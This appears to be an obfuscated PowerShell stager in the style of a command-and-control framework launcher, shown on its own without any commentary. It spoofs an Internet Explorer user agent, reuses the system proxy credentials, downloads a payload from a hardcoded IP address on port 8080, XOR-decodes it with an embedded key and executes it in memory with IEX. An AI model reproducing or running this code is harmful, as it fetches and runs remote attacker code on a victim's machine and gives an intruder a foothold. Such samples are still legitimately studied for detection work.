
[SySTEm.NeT.ServiCePoinTManAgeR]::EXpect100CONtiNUe = 0;$wC=NEw-OBjecT SystEM.NeT.WeBClieNT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HEAdErS.ADD('User-Agent',$u);$WC.PROxY = [SySTem.Net.WEbReQUest]::DEFaUlTWeBProXy;$wC.PROxY.CREDEnTials = [SYSTEM.NEt.CReDentIaLCAcHE]::DEFaUltNeTworkCredeNTIalS;$K='ceb6c970658f31504a901b89dcd3e461';$i=0;[CHar[]]$B=([char[]]($wC.DoWNloAdSTRiNG("http://172.18.209.58:8080/index.asp")))|%{$_-bXOr$K[$I++%$k.LenGtH]};IEX ($b-jOin'')

